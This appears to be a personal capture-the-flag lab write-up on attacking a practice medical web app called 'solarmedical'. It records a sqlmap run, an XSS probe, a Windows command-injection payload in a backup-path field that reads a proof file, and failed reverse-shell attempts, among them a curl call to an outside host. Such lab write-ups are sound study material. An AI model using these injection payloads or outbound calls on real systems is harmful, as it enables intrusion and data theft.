# Table of Contents 
1. `http:/solarmedical:80/dashboard`
2.  `/uploadResults`
3.  `SQLMAP test` 
4. `/Backup` directory - proof.txt

## Synopsis
After logging in with admin we get redirected to `http://solarmedical:80/dashboard`, and get `local.txt`, once here we have see `upload Test Result` leads to `http://solarmedical:80/uploadResults` - tested the `POST` with `SQLMAP` but didnt find any vulnerable fields, tested `XSS` here but got a `attack detected` alert so probably want the way. When reviewing the `gobuster` from the very beginning noticed the `/backup` directory. When browsing to this directory and adding the backup path `C:\test` hitting `start backup` shows that an `xcopy` command is running - with this parameter we can enumerate the file system by appending `&dir C:\proof.txt` to identify the `proof.txt` file then `c:\backup"&type c:\proof.txt` to spit out the file
### The Complete Path (Short)
```c++
> http://solarmedical/dashboard
-> http://solarmedical/uploadResults
--> http://solarmedical/Backup - command injection - proof.txt
```
##### Lessons learned 
- windows `command injection` commands `c:\test"&dir C:\proof.txt`
- [x] Running Methodology updated with Lessons learned

--------
#### `http:/solarmedical:80/dashboard`
- logged in with `admin:`
![[Pasted image 20241218131926.png]]
#### `/uploadResults`
![[Pasted image 20241218132115.png]]
#### `SQLMAP test`
the post request - testing `SQLMAP`
- 500 error - may have messed up the databases - all results came back with `might not be OR not injectable`
```go
â”Œâ”€â”€(rootðŸ’€gobots)-[18Dec2024 18:25:15]-[/home/â€¦/SUT/OSWA/challenge_labs/solarmedical]
â””â”€# sqlmap -r uploadresults_post.txt --batch --risk=2 --level=1 --flush-session

18:25:15] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. You can give it a go with the switch '--text-only' if the target page has a low percentage of textual content (~6.12% of page content is text). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:25:15] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 588 times

[*] ending @ 18:25:15 /2024-12-18/


```
```http
POST /uploadResults HTTP/1.1
Host: solarmedical
Content-Length: 2473
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://solarmedical
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynCS9rhOmg88xyPlI
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://solarmedical/uploadResults
Accept-Encoding: gzip, deflate, br
Cookie: ASP.NET_SessionId=dtrrmvfr111byg4yeayyspvm; .ASPXAUTH=C0BB5340D695B34280FEF61BDF7B6C6124CA38227AA28009D35831BA3C147BB9AF50E029D06A15FBAA4AF12E5552F84C5461AFABCA17E4DBDD052D81481614B9514BEE3FB0A2DF5139E0FC5BA2035CE5479319D25F0D9F319C43F9E6A98B49F9
Connection: keep-alive


------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="__VIEWSTATE"


8kj/krYQKdO2NxfgavIiZ0WX6QHg66BxWwTtLYBNHNUCdaD33wPsgtQmxPQvR1h8ZnbH9zOiEACjK7j1aVG/idLb5x6SiP+x7QgJnXo4ggxshwkdZDEKU5SKkTU2KA4Qm3/r8JOAriUxVQ6QAPS5GYAAl5mjS7nEvaT8Ek8Gt+y2CeMTKoosIhTkpWD23qYVAx0U/9v1/a2mDRV21y4yBMky78D5B44PYbz1PioOEQCP68XJDjuwlRPF8XY9bzbY7qcWXHcRdJDZLRZItV51qzlBbCkt1AwtdW+0x6Hq0yB2zBFUjczlEOX7D5IP2pw3AR44daCcQKwTSApAkiJrV5qniKnyZBrenjFzFsOlCfkEol4fbFBRxTwpBj5aPzGZojtZycPTyLlNCNAm0IupI4isTkaIAr171j1a+kmPZa9wAI1sCmxHgkq5wgVf3B92foyw+T3ixxlyyC4XEcYxjTw1lrBuW/1oo7uffe7Xw/DEW74+2oYP6T6xioEBjb9w1HruZJYr9xe64PtZWHq7mQ==

------WebKitFormBoundarynCS9rhOmg88xyPlI

Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"



DCF6CAC8

------WebKitFormBoundarynCS9rhOmg88xyPlI

Content-Disposition: form-data; name="__EVENTVALIDATION"



9xsXESmji7qQVUTLfscvcWu5tMG8Fp9Smd0cki26TMWuugZXYo27CnPWKyhB3nCuhBPXqKsvlPBjx3L7iSzFOkhSUpQUSBKzpLBjmj8lRWyxi2KoIF4oDm7eFy/Jn0mUjsP2nn1jVpF7kRVl4cTSHiKMW4S5BT0GlSBzmGVY5Yh2smVhkfVZSfEbJiYwFAGnjne6QzvmVJOH60GkI3DXzZUdLiGky+mdN7TBzygo8w2Y9niqrytrflVweGli9nX62AWeVIXOXJuB8mV9cXW/MgRUg4qatYhA/PpZcuC8TeZJoIobo7MW+bYe6CJBg3Ia9exLlHbN7JXgom711TbeIOkfdLm/ZIOyc1LU7My+H7elM4jsReK6KbKYeBjsbQz3oOn87SErUpYmbjl+w3u54cIW7nkJvVclpbUxEcwUuod6lY7OikWYPaYuI+/5MUBcV5SAfZJO/m8gV8l2Qtor1JqvBXJvjhm6KrKvBWB9TUqPX6MvFI04jQWHK0kxLt7+

------WebKitFormBoundarynCS9rhOmg88xyPlI

Content-Disposition: form-data; name="ddlPatient"



5
------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="ddlTestType"



2
------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="txtTestDate"



2024-12-19
------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="txtResultValue"



test
------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="txtUnits"



test
------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="txtRefRange"



test
------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="ddlStatus"



Normal
------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="txtNotes"



test
------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="fileUpload"; filename=""
Content-Type: application/octet-stream





------WebKitFormBoundarynCS9rhOmg88xyPlI
Content-Disposition: form-data; name="btnUpload"


Upload
------WebKitFormBoundarynCS9rhOmg88xyPlI--


```

##### `XSS test`
started by using this payload `<script>alert(0)</script>` to display an alert in all `Upload Test Results`
upon submission got `potentially dangerous detected`
![[Pasted image 20241218133118.png]]
#### `/backup` directory
tried utilizing this payload
```bash
c:\test"&dir C:\proof.txt
```
was able to identify `proof.txt`
![[Pasted image 20241218143356.png]]
navigate to `http://solarmedical/dashboard` and back to `http://solarmedical/backup` to refresh it
```bash
c:\backup"&type c:\proof.txt
```
proof.txt `44d9b5daadd2d574a9aa2220c2f903ae`
![[Pasted image 20241218143635.png]]
trying to get a `revshell` because `russo` made me.

tested `curl`  with this command `c:\backup"&curl http://192.168.45.196:1337/tst.txt`- didnt work, i dont think this machine can reach out
- also tried `URL Encoded powershell revshell payloads` - didnt work
![[Pasted image 20241218150846.png]]
showing nothing connected
![[Pasted image 20241218150903.png]]